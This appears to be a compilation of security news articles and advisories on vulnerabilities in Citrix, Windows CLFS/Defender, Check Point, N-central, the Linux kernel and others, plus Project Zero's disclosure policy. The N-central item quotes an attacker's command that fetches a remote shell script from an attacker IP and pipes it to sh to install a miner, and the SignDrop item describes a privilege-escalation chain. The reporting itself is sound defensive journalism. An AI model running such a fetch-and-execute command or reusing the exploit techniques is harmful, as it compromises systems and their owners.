The critical flaws stem from memory overflow issues in Packet Processing, SMPP traffic, DNS / DNS-over-HTTPS (DoH), NetScaler Push, Email OTP authentication, Endpoint Analysis (EPA/EPAS), and ICA proxy, and could lead to unpredictable/erroneous behavior or denial-of-service (DoS) conditions.

They are tracked as CVE-2026-120868, CVE-2026-107407 to CVE-2026-107410, CVE-2026-107412, CVE-2026-107415, CVE-2026-111334, and CVE-2026-120864.

Most of the remaining 19 security defects are high-severity weaknesses leading to similar outcomes. Citrix also patched several medium-severity bugs, including CVE-2026-111338, which exposes sensitive authentication material in a log file.

NetScaler ADC and Gateway versions 14.1-73.57 and later, 13.1-64.39 and later, 14.1-73.58 FIPS and later, and 13.1-FIPS and 13.1-NDcPP 13.1-37.293 and later contain the relevant patches.

Citrix urges customers to update their instances as soon as possible, and details CVE preconditions associated with some of the vulnerabilities.

Advertisement. Scroll to continue reading.

On Thursday, the company also announced patches for a critical-severity flaw in NetScaler Console. Tracked as CVE-2026-120869 (CVSS score of 9.4), it could allow unauthenticated attackers to bypass controls and access restricted resources.

The security defect impacts all NetScaler Console 14.1 releases before 14.1-74.34.

Citrix makes no mention of any of these vulnerabilities being exploited in the wild, but vulnerabilities in NetScaler are a frequent target for threat actors.

articles.title: OpenAI’s Daybreak brings AI agents to security testing and vulnerability fixes
articles.context: Red Team tests applications and verifies fixes Daybreak Red Team, offered through an early-access program, uses coordinated agents to examine application source code and...
articles.full_text:
OpenAI is bringing AI agents into more of the software security process with Daybreak, pairing web application penetration testing with tools that investigate vulnerabilities and develop fixes. The two offerings, Red Team and Defense Factory, connect the work of finding security weaknesses with patching and retesting them.

Red Team tests applications and verifies fixes

Daybreak Red Team, offered through an early-access program, uses coordinated agents to examine application source code and context, investigate potential attack paths and confirm vulnerabilities. It can validate findings from code scanners, bug bounty submissions and vulnerability disclosure reports, giving security teams evidence to help prioritize repairs.

Validate reported vulnerabilities (Source: OpenAI)

Once a patch is ready, Red Team can test whether it blocks the exploit. Assessments run within defined boundaries, using isolated environments and Guardian review to control which applications and endpoints agents can reach, according to OpenAI.

Defense Factory investigates vulnerabilities and prepares patches

Defense Factory handles the remediation side. Agents investigate findings from existing security tools or Red Team, trace vulnerabilities through the code and prepare proposed fixes. Engineers review and test patches before merging them, while Codex lets teams examine evidence, supply additional context and refine changes.

Put your existing security tools to work on fixes (Source: OpenAI)

Teams with access can install and enable the Daybreak Defense Factory (Preview) plugin in ChatGPT and connect a GitHub repository. Cloud scans run in Codex cloud, and each person starting a scan needs a personal GitHub connection. Scans can cover an entire repository’s default branch or selected folders and files.

Choose how to scan a repository (Source: OpenAI)

Teams can monitor new commits on the default branch, schedule recurring scans of that branch and enable security reviews of pull requests before changes merge. The desktop app also supports scans of local checkouts and uncommitted changes, with an optional Deep scan mode that makes multiple passes and uses additional time and tokens.

articles.title: New SignDrop Exploit Can Abuse Windows Defender to Bypass Security Protections
articles.context: Chaotic Eclipse is a researcher known for publicly releasing PoC exploits for zero-day vulnerabilities, often after criticizing vendors’ handling of vulnerability reports
articles.full_text:
SignDrop is a Windows zero-day that abuses CLFS security protections to let local attackers gain SYSTEM privileges and bypass defenses.

The researcher Chaotic Eclipse, also known as INFINITE NIGHTMARE, MSNightmare, Nightmare-Eclipse, and MSNightmare, published a proof-of-concept for a new Windows local privilege escalation zero-day, naming it SignDrop. The flaw sits inside the mitigation Microsoft rolled out specifically to stop attacks on the Common Log File System (CLFS), and the researcher published the code and a technical breakdown on GitHub.

“This vulnerability won’t affect all windows machines but I guess estimate 80% of the world’s windows installations are vulnerable to this. To check, you need to run the proof of concept or check your registry configuration, if it spawns a SYSTEM shell, you’re vulnerable.” the expert wrote on GitHub. “And you’re generally vulnerable if your windows installation is older than 90 days so it’s safe to assume that everyone reading this is definitely vulnerable.”

CLFS parses complex log files in kernel mode, which made it an easy target for memory corruption bugs over the years. To curb that, Microsoft introduced a Common Log FileSystem (CLFS) authentication mitigation, rolled out to the public release channel starting October 28, 2025. The mitigation is introduced in two stages. For the first 90 days, the system runs in learning mode. After that, full protection is enabled, and CLFS requires every log file to have a valid authentication code.

The researcher says the vulnerability is caused by this staged rollout. The advisory estimates that about 80% of Windows installations worldwide may be affected because systems still in the 90-day learning period, or with the mitigation only partially enabled, remain vulnerable. Users can check their systems by looking at the HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CLFS\Authentication\Mode registry key. A value of 0 or 1 means the system is vulnerable, while 2 or 3 means it is protected.

The bug lives in clfs.sys, specifically in how the driver creates the “.cnpf” authentication file tied to a new log container. CLFS does enforce access checks properly when a process creates its own log files, since it specifies OBJ_FORCE_ACCESS_CHECK so new objects stay under the calling process’s own context. The twist is what happens when a log file has an associated container: opening the original file also opens the one linked to it, and if that associated file is empty, CLFS will try to sign it whether or not a signature file already exists.

That behavior becomes dangerous the moment a different, more privileged process opens the file instead of the original caller. An attacker does not need special permissions to open a CLFS log file, only the correct file path. This allows a standard user to prepare a file and trick a process running with higher privileges into opening it. In this case, the researcher tricks Windows Defender into doing so by calling ServerMpUpdateEngineSignature and changing symbolic links in the Windows Object Manager. This makes Defender open the CLFS container from within its own antimalware engine.

Defender then follows the path stored in the original container to find the associated file. If the file has no signature, Defender creates one using SYSTEM privileges. CLFS then creates the new authentication file using the original file’s DACL, which defines who is allowed to access it.

“If everything is chained correctly, funnily this legit security mitigation can be used against itself and allow an elevation if privileges. Everything is done properly by Microsoft here but the logic allows abuse.” the researcher continues. “What makes it funnier is the fact that it can be used against any antimalware engine to bypass their self defense (or tamper protection) mechanism as you can trigger arbitrary file creation in the context of their own antimalware process so from the perspective of their kernel drivers, the file creation request is coming from their own legit process so it passes, this makes this vulnerability unique as it can be used to turn off any antivirus/EDR.”

The consequences reach beyond a single elevation of privilege trick because the same coercion can be pointed at any antimalware engine, not just Defender. The researcher pointed out that the driver’s file creation request appears to come from the antivirus’s own legitimate process, so it passes every check. That makes SignDrop usable to defeat self-defense and tamper-protection features across different security products, turning a shield into a door.

The researcher tested the proof-of-concept on Windows 11 26H2, Windows 11 26H2 Experimental, and Windows Server 2025 Experimental. There’s no workaround that doesn’t cost something: disabling the CLFS authentication mitigation removes the SignDrop path but brings back exposure to the memory corruption bugs the mitigation was built to stop in the first place.

“Unfortunately for now, disabling the mitigation will expose your machine to memory corruption vulnerabilities as CLFS still does not handle log files well, that’s why the mitigation exists in the first file so for now there is no solution to this except waiting for a patch to be released by Microsoft.” conclude the expert.

Chaotic Eclipse is a researcher known for publicly releasing PoC exploits for zero-day vulnerabilities, often after criticizing vendors’ handling of vulnerability reports. His releases have mainly targeted Microsoft products, including Windows and Microsoft Defender, with some later exploited in the wild. Among the most notable are the Undefend and RedSun Defender zero-days.

His work has fueled debate over responsible disclosure and the risks of publishing working exploits.

Recently, Chaotic Eclipse revealed that he is Abdelhamid Naceri, a security researcher. Naceri previously worked with Microsoft in the UK and Germany. In a now-deleted X post, he described his departure from the company, claiming Microsoft terminated his employment without giving him a clear reason. He said Microsoft offered several financial settlements, but he rejected them because he wanted a formal explanation and help staying in Germany.

Naceri also said he challenged the dismissal in a German labor court. According to his account, Microsoft changed its arguments during the case, but the court ultimately upheld the termination. He said the long legal dispute left him with almost no compensation and caused serious financial and emotional problems, including treatment in a psychiatric hospital.

The researcher also admitted that an earlier claim that Microsoft had taken legal action against him was fabricated. The claim came during the controversy over Microsoft’s threats of legal action against security researchers who disclosed zero-day vulnerabilities.

In September, Chaotic Eclipse released a zero-day exploit targeting Microsoft Defender. The researcher named the exploit BigDiskBuster, it triggers a Denial of Service Vulnerability in Windows Defender Update.

In September, Chaotic Eclipse also released multiple zero-day exploits targeting Nvidia (GreenSection) and Microsoft Defender (ShieldCrash).

The expert also released exploits targeting other anti-malware and defense solutions. He released a zero-day exploit targeting Kaspersky Endpoint Security he named HardBreacher, which triggers a privilege escalation flaw. The researcher pointed out that the PoC is unstable and may require repeated attempts, but when successful, it creates a DLL in System32 with full user permissions. The researcher also claims taking control of Kaspersky’s UI process can disrupt the antivirus and interfere with file-access controls, potentially leaving the system in an unstable state.

The researcher also released a zero-day exploit named PrettyPrague targeting GenDigital Avast Antivirus. The exploit triggers a privilege escalation flaw.

Finally, Chaotic Eclipse released a new zero-day exploit targeting Crowdstrike Falcon cybersecurity platform. The researcher named the exploit FalconFlank, it triggers a privilege escalation flaw.

Follow me on Twitter: @securityaffairs and Facebook and Mastodon

Pierluigi Paganini

(SecurityAffairs – SignDrop, Chaotic Eclipse)

articles.title: Hackers Exploit PHP2Shell Flaws in Check Point Gateways to Deploy TSGA Backdoor and Wipe ESXi Files
articles.context: "The issue is a local privilege escalation and requires the attacker to already have local code execution on the appliance," Check Point said, adding it "observed an active...
articles.full_text:
An unknown threat actor has been observed targeting unpatched Check Point Security Gateways to obtain initial access via the PHP2Shell vulnerabilities and then a previously unreported local privilege escalation flaw in Gaia OS to deploy a backdoor called TSGA.

The activity, detailed by Check Point, began on October 30, 2026, and targeted Israeli organizations, with a broader follow-up wave on November 2, 2026, that targeted organizations across multiple countries and sectors. Some of the organizations singled out in the first wave have also been at the receiving end of destructive actions that include the deployment of wiper malware.

"PHP2Shell provided initial access, followed by privilege escalation through the DynamicCLI interface, tracked as CVE-2026-123039," Check Point said. "The attackers then deployed PHP web shells, the persistent TSGA backdoor, and its embedded TSProxy networking component."

"The attackers pivoted from the gateway to a VMware ESXi host over SSH, deployed the destroy_v6 wiper, and left politically themed DREAM_ANNEXATION.txt notes during the destructive stage."

CVE-2026-123039 (CVSS score: 7.8) is a missing authorization flaw that could enable privilege escalation to root in the DynamicCLI process, enabling any authenticated local user to run arbitrary commands by writing a single request to the socket.

"The issue is a local privilege escalation and requires the attacker to already have local code execution on the appliance," Check Point said, adding it "observed an active exploit of this vulnerability against a couple of dozen customers."

The issue impacts versions R82.20, R82.10, R82, R81.20, R81.10, and R81 of the following products -

Check Point Force Firewalls

Check Point Management and Log Servers

Multi-Domain Security Management and Multi-Domain Log Server

Maestro Orchestrator

"In late October 2026, approximately one week after a security fix became available, activity originating from 130.94.19[.]204 targeted Israeli organizations through vulnerable Mobile Access portals on Check Point Security Gateways," Check Point said.

"Evidence suggested some cases of a successful compromise, with exploitation activity consistent with PHP2Shell, associated with CVE-2026-109618 and CVE-2026-109619."

After obtaining initial access, the unknown hacking group is said to have escalated privileges from the portal service account to root by weaponizing CVE-2026-123039 and deploying PHP web shells with an aim to establish persistent access. The web shells support command execution and file upload capabilities.

The November 2, 2026, wave is said to have targeted some Israeli organizations that had already been targeted in the first wave, alongside other organizations worldwide, without demonstrating any specific geographic or sector preference, indicating an opportunistic initial-access effort.

The access afforded by the web shell paves the way for TSGA, a standalone passive backdoor that also includes a second component called TSProxy. TSGA, deployed as slot_CPconfigdaemon, has been described as a Linux gateway implant with Check Point-specific functionality, offering encrypted remote access, configuration theft, backup and snapshot persistence, process injection, and binary firewall-log tampering.

"[TSProxy's] injection code loads this library into selected appliance processes, where it intercepts networking functions to handle specially marked attacker connections while allowing ordinary traffic to continue," Check Point said. "This combines a persistent standalone backdoor with concealed access through existing appliance services."

Some of the other post-exploitation actions observed are listed below -

Deploying the gogo scanner on the gateway to discover internal assets and services across the network.

Moving laterally to a VMware ESXi host over SSH by authenticating with the vpxuser service account.

Staging a Linux ELF wiper called destroy_v6 and executing it. The malware recursively traverses the target directory and deletes all files regardless of their extension. It also attempts to overwrite files with zeros before deleting them.

Dropping a note named "DREAM_ANNEXATION.txt" in each processed directory.

Both TSGA and TSProxy are assessed to be Check Point-specific components of a toolkit dubbed PhiliKit that was first documented by ESET in June 2026, attributing it to a China-nexus cyber espionage group tracked as Armory Castle (formerly UNC5221).

Other factors that point to the involvement of a possible China-aligned threat actor include the use of LightNode VPS infrastructure and the fact that scanning activity was concentrated between 12 and 9 a.m. UTC, coinciding with typical Chinese working hours.

However, the cybersecurity company said it does not have enough evidence to link the latest campaign to the threat actor or other known Chinese-nexus groups, citing the following reasons -

Use of wiper malware

Focus on Israel and explicit references to the Israeli-Palestine conflict in the wiper note

"Taken together, the evidence does not allow us to assess with high confidence the true nature of this operation," Check Point said. "Several scenarios remain plausible: the identified actor ran the entire campaign, acted solely as an initial access broker, or took part in a false-flag operation. It is also possible that the destructive activity served as a smoke screen."

articles.title: Policy and Disclosure: 2026 Edition
articles.context: A vulnerability’s severity does not affect the likelihood that it will be discovered by attackers, only its impact on users
articles.full_text:
Since 2021, Project Zero has followed a “90 + 30” vulnerability disclosure policy, allowing vendors up to 90 days to remediate a vulnerability plus an extra 30 days “soak time” for patch rollout. Our goal was to encourage faster patching and give vendors time to deliver patches to users. The advent of AI-assisted vulnerability discovery and exploitation has changed the threat landscape such that the vulnerability remediation timeline encouraged by our disclosure policy is clearly insufficient.

LLMs have increased the speed at which attackers can find and exploit vulnerabilities, alongside the risk that multiple parties, including malicious ones, discover the same bug. A vulnerability reported today presents a much higher immediate risk to users than one reported last year. In this new environment, it is crucial that vendors move towards remediating vulnerabilities faster.

LLMs have also decreased the time it takes for attackers to reverse engineer and exploit a vulnerability based on a patch, to the extent that zero patch-to-exploitation time is a reasonable, though imperfect, model of attacker behavior. Patch soak time is no longer meaningful in a world where attackers can almost immediately determine bug details from a patch, and can put users at risk by creating a false sense of secrecy. “Patch gap” is the time between a fix being released for a security vulnerability and the user installing the relevant update. It is equally crucial that vendors reduce patch gap, either by reducing patch rollout time or using other strategies to protect users while remediation is in progress.

LLMs have also increased the volume of vulnerabilities that Project Zero reports. We are finding several vulnerabilities a week in targets where we once found a few vulnerabilities a year. Aspects of our policy that require vendor negotiation or agreement, including determining whether a bug is fixed and whether grace period applies, are quickly becoming unmanageable.

Today, we are announcing a new vulnerability disclosure policy, created with the following goals in mind:

Encourage faster vulnerability remediation

Encourage vendors to reduce “patch gap”

Allow for the policy to be automated by both Project Zero and vendors

Our new policy: “Full X”

Vulnerabilities will be disclosed X days after they are reported to the vendor.

Starting today, our policy is “Full 90”, i.e. vulnerabilities will be disclosed 90 days after they are reported to the vendor.

On February 2, 2027, we will move to a “Full 60” policy where vulnerabilities are disclosed after 60 days.

On January 3, 2028, we will move to a “Full 30” policy where vulnerabilities are disclosed after 30 days.

We are also removing most ‘special cases’ from our disclosure policy, including grace period and variant policy. The only exceptions to our new policy are:

Vulnerabilities actively exploited in the wild -- ITW vulnerabilities will be handled according to Google’s application security vulnerability disclosure policy

Public vulnerabilities -- Project Zero may make details of a vulnerability public, at our discretion, if the details have already been made public by others

Vendor request -- We will make vulnerability details public if the vendor we reported it to requests it

Why reduce remediation time gradually?

Project Zero solicited feedback from the vendors we report the most vulnerabilities to as a part of developing this new policy. An overarching concern was that immediately changing the policy could harm users by making unfixed vulnerabilities available to attackers while vendors are in the process of improving their remediation processes and technology. While the benefits of delaying disclosure are declining due to the increased probability that attackers will discover a vulnerability during the embargo period, we still feel there are benefits in the short term.

In addition, vendors mentioned two more subtle concerns. One was that an overly-aggressive disclosure policy would encourage fixing bugs reported under the new policy with more priority, even if they are less severe than other reported vulnerabilities. The other was that immediately enforcing a policy that some vendors aren’t equipped to meet might lead to a state where vendors accept that they cannot fix bugs within the deadline and don’t attempt to.

We decided on a policy that encourages vendors to improve remediation time on a schedule that is challenging but realistic, with the hope that this will lead to vendors broadly improving their remediation processes and infrastructure in a way that eventually enables them to fix all reported vulnerabilities quickly.

What about severity?

While our analysis isn’t always perfect, Project Zero only reports vulnerabilities with substantial severity and demonstrated security impact in our tracker. That said, we don’t feel severity is an effective metric for making disclosure decisions, especially in the current environment. A vulnerability’s severity does not affect the likelihood that it will be discovered by attackers, only its impact on users.

When vendors determine severity and use it to prioritize bug fixes, they are making decisions about what risks they are willing to expose their users to, and it is reasonable to accept the risk of low-severity bugs, like unexploitable null pointer crashes or minor info leaks in a lot of circumstances. But this doesn’t change the availability of these vulnerabilities to attackers, and we want our policy to reflect this reality.

It’s also important to acknowledge that Project Zero holds itself to high standards with regards to the reproducibility, readability, reachability and reported security impact of the vulnerabilities we report. This policy assumes bugs reports are of this quality, and it is reasonable for vendors to treat low quality-bug reports differently.

What about hardware?

We encourage all vendors to consider how they would respond to imminent disclosure of a serious vulnerability, including non-patch strategies, as there is no guarantee that defenders will be the first to find a bug. That said, Project Zero has occasionally granted exceptions to our policy on rare occasions, including Spectre and Meltdown, and will continue to do so in the future.

Are you really not going to check whether bugs are fixed?

The question of whether a bug is fixed for the purposes of our policy has always been challenging and somewhat unresolved, particularly with regards to code that is not shipped directly to users and not publicly available. It is not unusual for Project Zero to communicate with vendors multiple times for each bug report to come to an agreement on whether a vulnerability is fixed. As more vendors experiment with vulnerability remediation strategies that are not patching like temporarily disabling code paths, we expect this to become even more complex.

We still plan to track whether bugs are fixed and communicate if they are not, however, this will not be a decision point in our policy. This will enable us to share technical details of how users are protected without needing to make a binary judgement with consequences for the vendor.

articles.title: ZDI-26-1008: (Pwn2Own) Qualcomm Technologies QCA7005 GreenPhy Heap-based Buffer Overflow Code Execution Vulnerability
articles.context: Vulnerability Details This vulnerability allows physically present attackers to execute arbitrary code on affected installations of Qualcomm Technologies QCA7005 powerline chips
articles.full_text:
Vulnerability Details

This vulnerability allows physically present attackers to execute arbitrary code on affected installations of Qualcomm Technologies QCA7005 powerline chips. Authentication is not required to exploit this vulnerability.

The specific flaw exists within the handling of vendor-specific GreenPhy management messages. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a fixed-length heap-based buffer. An attacker can leverage this vulnerability to execute code on the powerline communication chip.

Additional Details

Qualcomm Technologies has issued an update to correct this vulnerability. More details can be found at: https://docs.qualcomm.com/securitybulletin/may-2026-bulletin.html

articles.title: ZDI-26-1007: Linux Kernel BPF Local Storage Race Condition Local Privilege Escalation Vulnerability
articles.context: An attacker must first obtain the ability to execute high-privileged code on the target system in order to exploit this vulnerability
articles.full_text:
Vulnerability Details

This vulnerability allows local attackers to escalate privileges on affected installations of Linux Kernel. An attacker must first obtain the ability to execute high-privileged code on the target system in order to exploit this vulnerability.

The specific flaw exists within the handling of bpf_local_storage_elem objects. The issue results from the lack of proper locking when performing operations on an object. An attacker can leverage this vulnerability to escalate privileges and execute arbitrary code in the context of the kernel.

Additional Details

Linux has issued an update to correct this vulnerability. More details can be found at: https://github.com/torvalds/linux/commit/5bdd61e98da5468140aff5b5abc0e8544deaf2ee

The specific flaw exists within the handling of plugin packages. The issue results from the lack of proper validation of a user-supplied path prior to using it in file operations. An attacker can leverage this vulnerability to execute arbitrary code in the context of the current user.

Additional Details

KiCad has issued an update to correct this vulnerability. More details can be found at: https://gitlab.com/kicad/code/kicad/-/commit/e60c1fc0838339200742cc1ac9fcc1302cbedec5

articles.title: Hackers Exploit N-central Flaws to Infect 21 Servers, Including 19 Running Hotfix 2
articles.context: The attacks have been found to string together a critical Apache Axis vulnerability, tracked as CVE-2026-90436 (CVSS score: 9
articles.full_text:
N-able on Thursday said it's taking additional precautions in the wake of public disclosure of a new set of flaws tracked as 4EverAble2Shell and Agent2Shell.

"We are restricting certain N-central features and integrations," the company said in a Thursday update. "These measures may affect some functionality, but we believe taking additional precautions while remediation is completed is the right action to protect our partners and their customers."

The following actions have been applied to Hosted environments -

Legacy API is turned off by default in the product.

Intune integration has been turned off while additional protections are implemented and validated.

Hosted customers are also being recommended to follow N-able's previous guidance to upgrade Agents and Probes on N-central version 2026.4 HF1 and above, as the update introduces changes in how the Probe and Agent communicate.

"N-able N-central 2026.4 HF1 updates legacy components of the Agent and Probe, which changes how the two communicate," it said. "As such, upgrading both Agents and Probes in your N-central server is a MUST to ensure all managed devices are communicating and patched."

On-premises customers are being urged to upgrade Agents and Probes and ensure Legacy API access is disabled in the environment, if it has been previously turned on.

"Our teams are actively assessing the new disclosures, developing additional remediation, and working to safely restore affected functionality," N-able said. "Protecting our partners and their customers remains our highest priority, and we will continue to take precautionary action where necessary."

The development comes as independent security researcher Sean Bales disclosed two new sets of flaws called 4EverAble2Shell and Agent2Shell that work against the latest version of N-central and can allow attackers to execute arbitrary code as root and gain SYSTEM-level access to Windows systems under specific conditions.

Multiple threat intelligence reports show that 4EverAble2Shell has moved beyond preliminary probing to active exploitation efforts, with threat actors leveraging it to deploy cryptocurrency miners on vulnerable servers.

The attacks have been found to string together a critical Apache Axis vulnerability, tracked as CVE-2026-90436 (CVSS score: 9.8), with a separate N-central privilege escalation weakness to obtain root-level access.

"An unauthenticated exploit chain in N-able N-central, disclosed as 4EverAble2Shell, is reported to allow remote attackers to execute arbitrary operating-system commands with root privileges," Previdian, which is tracking the flaw as VULN-2026-0009, said.

"The chain exploits unsafe class instantiation during SOAP fault processing in the bundled Apache Axis component. A crafted request causes an attacker-selected JLine class to process malicious input, resulting in command execution as the nable service account."

In an exploit chain detailed by the threat intelligence company, threat actors have been observed attempting to download and execute a shell script ("jup.sh") from an attacker-controlled server at "157.20.241[.]16," while sending back diagnostic information and command output to the server.

Cybersecurity company Huntback has also revealed that the same IP address is weaponizing the 4EverAble2Shell flaw, deploying an XMRig Monero cryptocurrency miner on 21 N-central servers via the aforementioned shell script -

mount -o remount,exec /tmp 2>/dev/null; curl -fsSL hxxp://157.20.241[.]16:8080/jup.sh | sh -s nc_[target-IP-redacted]

The miner is designed to use only half of the available CPU cores, likely in an effort to fly under the radar. The compromised N-central servers are concentrated across the U.S., South Africa, Canada, the U.K., Germany, France, and Sweden.

"The miner is the only payload we have seen, but the escalation hands the operator root on a host that manages your customers' endpoints," Huntback said. "Treat a hit as a full compromise, not a cleanup job. Applying Hotfix 2 is not enough on its own: 19 of the victims here were already running it."

articles.title: Linux Kernel TCP Flaw (CVE-2026-98432)
articles.context: On October 25, 2026, the National Vulnerability Database published CVE-2026-98432, a vulnerability in the Linux kernel's IPv4 TCP stack
articles.full_text:
What happened?

On October 25, 2026, the National Vulnerability Database published CVE-2026-98432, a vulnerability in the Linux kernel's IPv4 TCP stack. The flaw is a use-after-free: when a server handles a retransmitted SYN for a connection request, it can read IP options from memory that has already been freed. This can lead to a crash or memory corruption. The Linux kernel fix defers freeing these IP options until after an RCU (read-copy-update) grace period, so no thread can still be using them when they are released.

Okta's response

Security Patching: All Okta and Auth0 environments are fully patched or mitigated against this issue.

No Evidence of Exploitation: To date, Okta and Auth0 have observed no evidence of exploitation.

Do I need to do anything?

For customers running Okta Access Gateway (OAG), we recommend upgrading to the latest version and restarting your appliance to ensure the patched kernel is loaded.
